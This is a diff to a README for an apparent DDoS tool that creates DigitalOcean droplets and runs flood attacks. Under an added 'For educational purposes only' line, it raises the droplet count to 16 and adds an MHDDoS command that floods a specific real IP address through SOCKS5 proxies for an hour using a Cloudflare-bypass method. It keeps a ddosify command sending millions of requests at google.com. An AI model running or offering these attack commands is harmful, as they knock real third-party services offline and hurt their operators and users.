@@ -1,13 +1,18 @@
+For educational purposes only.
+
 ## Usage
 
-
 ````
-npm run create -- -c 2
+npm run create -- -c 16
 ````
-Creates 2 new droplets in Digital Ocean, installs ddosify. See `constants.js`. Edit `constants.js` to change `CPU` & `REGION`.
+Creates 16 new droplets in Digital Ocean, installs ddosify. See `constants.js`. Edit `constants.js` to change `CPU` & `REGION`.
 
 ````
 npm run attack -- "ddosify -t 'https://google.com' -n $((10000 * 333)) -d 10000 -T 999 -m GET"
+````
+
+````
+npm run attack -- "python3 MHDDoS/start.py CFB 95.167.23.6:80 5 1000 socks5.txt 1000 3600 debug=true"
 ````
 
 ````
